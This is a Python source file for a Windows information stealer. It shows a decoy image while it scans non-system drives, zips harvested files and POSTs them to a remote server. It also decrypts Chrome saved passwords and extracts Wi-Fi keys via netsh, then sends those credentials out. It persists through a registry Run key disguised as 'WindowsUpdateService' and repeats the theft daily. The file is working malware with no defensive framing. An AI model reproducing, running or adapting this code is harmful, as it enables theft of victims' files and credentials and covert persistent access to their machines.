import os
import requests
import threading
import winreg
import socket
import subprocess
import sys
import zipfile
import io
import time
import platform
from dotenv import load_dotenv
from PIL import Image
import threading
load_dotenv()
import os
if platform.system() != "Windows":
    exit(0) 
class FileHarvester:
    def __init__(self, server_url):
        self.server_url = server_url
        self.excluded_drives = ['C:\\'] 
        self.file_types = ['.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', 
                          '.jpg', '.png', '.jpeg', '.mp3', '.mp4', '.zip', 
                          '.rar', '.7z', '.exe', '.dll', '.config', '.ini']
        self.max_file_size = 100 * 1024 * 1024 
        self.collected_files = []
    def get_all_drives(self):
        drives = []
        for drive in range(ord('A'), ord('Z') + 1):
            drive_letter = f"{chr(drive)}:\\"
            if os.path.exists(drive_letter) and drive_letter not in self.excluded_drives:
                drives.append(drive_letter)
        return drives
    def collect_files(self, path):
        try:
            for root, dirs, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    if any(file_path.endswith(ext) for ext in self.file_types):
                        if os.path.getsize(file_path) <= self.max_file_size:
                            self.collected_files.append(file_path)
        except Exception as e:
            pass
    def read_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                return f.read()
        except:
            return None
    def compress_and_send(self):
        if not self.collected_files:
            return
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for file_path in self.collected_files[:100]: 
                content = self.read_file(file_path)
                if content:
                    try:
                        zip_file.writestr(file_path, content)
                    except:
                        continue
        zip_buffer.seek(0)
        try:
            files = {'files': ('stolen_files.zip', zip_buffer, 'application/zip')}
            data = {
                'hostname': socket.gethostname(),
                'user': os.getlogin(),
                'timestamp': time.time()
            }
            response = requests.post(f"{self.server_url}/upload", 
                                   files=files, 
                                   data=data,
                                   timeout=30)
            if response.status_code == 200:
                print(f"[+] Successfully sent {len(self.collected_files)} files to server")
            else:
                print(f"[-] Failed to send files: {response.status_code}")
        except Exception as e:
            print(f"[-] Connection error: {e}")
    def steal_browser_passwords(self):
        stolen_data = []
        try:
            import sqlite3
            import shutil
            import win32crypt
            chrome_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
            if os.path.exists(chrome_path):
                temp_db = "temp_chrome.db"
                shutil.copy2(chrome_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    url = row[0]
                    username = row[1]
                    encrypted_password = row[2]
                    try:
                        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                        if decrypted_password:
                            stolen_data.append({
                                'url': url,
                                'username': username,
                                'password': decrypted_password.decode('utf-8')
                            })
                    except:
                        pass
                conn.close()
                os.remove(temp_db)
        except:
            pass
        return stolen_data
    def steal_wifi_passwords(self):
        wifi_passwords = []
        try:
            profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore')
            profile_names = [line.split(":")[1].strip() for line in profiles.split('\n') if "All User Profile" in line]
            for profile in profile_names:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors='ignore')
                    password_lines = [line.split(":")[1].strip() for line in results.split('\n') if "Key Content" in line]
                    if password_lines:
                        wifi_passwords.append({
                            'ssid': profile,
                            'password': password_lines[0]
                        })
                except:
                    continue
        except:
            pass
        return wifi_passwords
    def run(self):
        print("[+] Starting file harvesting operation...")
        drives = self.get_all_drives()
        print(f"[+] Found {len(drives)} non-system drives")
        for drive in drives:
            print(f"[+] Scanning {drive}")
            self.collect_files(drive)
        print(f"[+] Collected {len(self.collected_files)} files")
        print("[+] Stealing browser passwords...")
        browser_data = self.steal_browser_passwords()
        print("[+] Stealing WiFi passwords...")
        wifi_data = self.steal_wifi_passwords()
        print("[+] Sending data to server...")
        self.compress_and_send()
        if browser_data or wifi_data:
            try:
                credentials = {
                    'browser_passwords': browser_data,
                    'wifi_passwords': wifi_data,
                    'hostname': socket.gethostname(),
                    'user': os.getlogin()
                }
                requests.post(f"{self.server_url}/credentials", 
                                       json=credentials,
                                       timeout=30)
                print(f"[+] Sent {len(browser_data)} browser passwords and {len(wifi_data)} WiFi passwords")
            except:
                print("[-] Failed to send credentials")
        print("[+] Operation complete. Fuck privacy! 😈")
def persist_in_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                           r"Software\Microsoft\Windows\CurrentVersion\Run", 
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(key)
        print("[+] Added to startup registry")
    except:
        print("[-] Failed to add to startup")
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except AttributeError:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)
def open_image(relative_path):
    image_path = resource_path(relative_path)
    Image.open(image_path).show()
if __name__ == "__main__":
    threading.Thread(
        target=open_image,
        args=("picture.jpg",)
    ,daemon=True).start()
    SERVER_URL = os.getenv('SERVER')
    persist_in_startup()
    harvester = FileHarvester(SERVER_URL)
    harvester.run()
    threading.Timer(86400, harvester.run).start()